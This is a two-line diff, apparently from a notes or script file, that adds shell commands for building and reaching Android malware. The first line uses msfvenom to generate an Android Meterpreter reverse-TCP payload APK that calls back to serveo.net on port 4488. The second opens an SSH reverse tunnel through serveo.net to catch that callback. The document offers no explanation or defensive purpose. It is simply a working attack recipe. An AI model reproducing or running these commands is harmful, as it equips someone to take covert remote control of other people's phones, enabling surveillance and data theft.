@@ -1,0 +1,2 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=4488 R > /sdcard/payload.apk
+ssh -R 4488:localhost:4488 serveo.net
